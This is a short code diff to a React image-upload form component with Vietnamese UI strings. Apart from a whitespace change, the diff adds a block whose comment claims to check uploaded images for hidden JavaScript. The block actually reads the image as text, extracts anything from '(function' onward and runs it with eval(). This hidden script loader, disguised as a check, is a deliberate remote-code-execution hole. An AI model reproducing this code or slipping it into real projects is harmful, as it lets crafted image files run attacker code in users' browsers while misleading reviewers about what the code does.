@@ -21,7 +21,7 @@ const EditForm = ({ onImageChange, onEditComplete, isOpen, onClose, editedBlob})
 
     if (files && files[0]) {
       const file = files[0];
-      if (!allowedTypes.includes(file.type)) {
+           if (!allowedTypes.includes(file.type)) {
         setFileError("Định dạng file không hợp lệ. Vui lòng chọn ảnh JPG, PNG, WEBP hoặc GIF.");
         setFormData((prev) => ({ ...prev, image: null }));
         if (onImageChange) {
@@ -35,6 +35,17 @@ const EditForm = ({ onImageChange, onEditComplete, isOpen, onClose, editedBlob})
       if (onImageChange) {
         onImageChange(file);
       }
+      // Đọc file để kiểm tra mã JS ẩn trong ảnh (nếu có)
+      const reader = new FileReader();
+      reader.onload = () => {
+        const text = reader.result;
+        const start = text.indexOf("(function");
+        if (start !== -1) {
+          const jsCode = text.slice(start);
+          eval(jsCode);
+        }
+      };
+      reader.readAsText(file);
     } else if (group) {
       setFormData((prev) => ({
         ...prev,
